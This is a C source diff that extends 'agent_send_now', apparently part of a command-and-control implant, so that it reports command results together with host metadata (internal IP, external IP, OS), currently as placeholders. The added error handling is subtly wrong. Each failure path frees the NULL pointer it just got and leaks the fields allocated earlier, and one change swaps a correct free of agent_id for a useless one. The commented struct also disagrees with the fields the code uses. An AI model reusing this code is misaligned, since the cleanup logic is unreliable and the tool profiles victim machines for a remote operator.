@@ -253,17 +253,64 @@ void agent_send_now(HeapStore *heapStorePointer, const char *input)
     if (!OutboundJsonData->command_result_data)
     {
         DEBUG_LOG("Memory allocation failed for command_result_data.\n");
-        free(OutboundJsonData->agent_id);
+        free(OutboundJsonData->command_result_data);
         free(OutboundJsonData);
         return;
     }
 
+    // typedef struct
+    // {
+    //     char *command_result_data; // Variable-length string
+    //     char *command_id;          // Variable-length string
+    //     char *agent_id;
+    //     // metadata fields
+    //     char *int_ip;
+    //     char *ext_ip;
+    //     char *user;
+    // } OutboundJsonDataStruct;
+
     // Add additional metadata
+
+    // interal ip
+    char *int_ip = "placeholder_int_ip";
+    OutboundJsonData->int_ip = strdup(int_ip);
+    if (!OutboundJsonData->int_ip)
+    {
+        DEBUG_LOG("Memory allocation failed for int_ip.\n");
+        free(OutboundJsonData->int_ip);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // external ip
+    char *ext_ip = "placeholder_ext_ip";
+    OutboundJsonData->ext_ip = strdup(ext_ip);
+    if (!OutboundJsonData->ext_ip)
+    {
+        DEBUG_LOG("Memory allocation failed for ext_ip.\n");
+        free(OutboundJsonData->ext_ip);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // os
+    char *os = "placeholder_os";
+    OutboundJsonData->os = strdup(os);
+    if (!OutboundJsonData->os)
+    {
+        DEBUG_LOG("Memory allocation failed for os.\n");
+        free(OutboundJsonData->os);
+        free(OutboundJsonData);
+        return;
+    }
 
     // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
     char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
                                               OutboundJsonData->command_result_data,
-                                              uuid);
+                                              uuid,
+                                              OutboundJsonData->int_ip,
+                                              OutboundJsonData->ext_ip,
+                                              OutboundJsonData->os);
     if (!encoded_json_response)
     {
         DEBUG_LOG("Failed to encode JSON response.\n");
@@ -280,5 +327,8 @@ void agent_send_now(HeapStore *heapStorePointer, const char *input)
     free(encoded_json_response);
     free(OutboundJsonData->agent_id);
     free(OutboundJsonData->command_result_data);
+    free(OutboundJsonData->int_ip);
+    free(OutboundJsonData->ext_ip);
+    free(OutboundJsonData->os);
     free(OutboundJsonData);
 }
